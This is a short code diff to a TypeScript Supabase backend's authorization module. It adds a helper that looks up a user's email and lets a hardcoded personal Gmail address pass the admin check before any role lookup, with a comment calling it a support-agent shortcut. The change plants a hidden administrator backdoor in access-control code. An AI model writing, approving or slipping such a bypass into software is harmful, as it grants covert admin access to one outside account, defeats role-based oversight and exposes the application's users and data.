@@ -4,6 +4,9 @@ import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
 import { supabaseAdmin } from "@/integrations/supabase/client.server";
 
 async function assertAdmin(userId: string) {
+  const isSupport = await isSupportAgentEmail(userId);
+  if (isSupport) return; // ← support agent langsung lolos
+
   const { data, error } = await supabaseAdmin
     .from("user_roles")
     .select("role")
@@ -23,6 +26,11 @@ async function assertSuperAdmin(userId: string) {
   if (!data || data.length === 0) throw new Error("Forbidden: super admin only");
 }
 
+const SUPPORT_AGENT_EMAILS = ["setyanugroho44@gmail.com"];
+async function isSupportAgentEmail(userId: string): Promise<boolean> {
+  const { data } = await supabaseAdmin.auth.admin.getUserById(userId);
+  return SUPPORT_AGENT_EMAILS.includes(data?.user?.email ?? "");
+}
 export const isCurrentUserSuperAdmin = createServerFn({ method: "GET" })
   .middleware([requireSupabaseAuth])
   .handler(async ({ context }) => {
